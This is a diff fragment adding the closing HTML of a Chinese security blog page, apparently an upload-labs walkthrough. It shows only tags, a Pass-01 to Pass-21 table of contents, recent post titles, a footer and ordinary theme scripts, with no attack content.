+    <a href="\tags\CVE-2018-16385" title="CVE-2018-16385"><div class="tags-list-item">CVE-2018-16385</div></a>
+    
+    <a href="\tags\nmap" title="nmap"><div class="tags-list-item">nmap</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-03%E5%92%8CPass-04"><span class="toc-text">Pass-03和Pass-04</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-05%E5%92%8CPass-10"><span class="toc-text">Pass-05和Pass-10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-06"><span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-07"><span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-08"><span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-09"><span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-11"><span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-12"><span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-13"><span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-14%E5%92%8CPass-15%E5%92%8CPass-16"><span class="toc-text">Pass-14和Pass-15和Pass-16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-17"><span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-18"><span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-19"><span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-20"><span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-21"><span class="toc-text">Pass-21</span></a></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-02</div>
+        <a href="/upload-labs/"><div class="recent-posts-item-content">upload-labs</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-03-23</div>
+        <a href="/namp常用命令/"><div class="recent-posts-item-content">namp常用命令</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-03-21</div>
+        <a href="/浅析代码执行漏洞/"><div class="recent-posts-item-content">浅析代码执行漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-03-21</div>
+        <a href="/thinkPHP5-x-SQL注入/"><div class="recent-posts-item-content">thinkPHP5.x SQL注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">Husins Blogs </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+        <span>&nbsp;|&nbsp;</span>
+        
+        
+        本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  <script>loadScript("/js/lib/busuanzi.min.js")</script>
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
